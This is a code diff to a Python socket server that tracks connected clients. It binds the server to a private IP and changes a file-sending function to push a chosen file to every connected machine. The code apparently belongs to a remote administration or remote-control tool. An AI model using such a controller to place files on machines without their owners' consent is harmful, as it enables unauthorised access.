@@ -8,7 +8,7 @@ queue = Queue()
 arrAddresses = []
 arrConnections = []
 
-strHost = "0.0.0.0"
+strHost = "10.5.41.57"
 intPort = 3000
 
 # function to return decoded utf-8
@@ -256,23 +256,24 @@ def startup():
 
 
 def send_file():
-    strFile = remove_quotes(input("\n" + "File to send: "))
-    if not os.path.isfile(strFile):
-        print("Invalid File!")
-        return
+    for conn in arrConnections:
+        strFile = remove_quotes(input("\n" + "File to send: "))
+        if not os.path.isfile(strFile):
+            print("Invalid File!")
+            return
 
-    strOutputFile = remove_quotes(input("\n" + "Output File: "))
-    if strOutputFile == "":  # if the input is blank
-        return
+        strOutputFile = remove_quotes(input("\n" + "Output File: "))
+        if strOutputFile == "":  # if the input is blank
+            return
 
-    conn.send(str.encode("send" + str(os.path.getsize(strFile))))
+        conn.send(str.encode("send" + str(os.path.getsize(strFile))))
 
-    objFile = open(strFile, "rb")  # send file contents and close the file
-    time.sleep(1)
-    conn.send(objFile.read())
-    objFile.close()
+        objFile = open(strFile, "rb")  # send file contents and close the file
+        time.sleep(1)
+        conn.send(objFile.read())
+        objFile.close()
 
-    conn.send(str.encode(strOutputFile))
+        conn.send(str.encode(strOutputFile))
 
     print("Total bytes sent: " + str(os.path.getsize(strFile)))
 
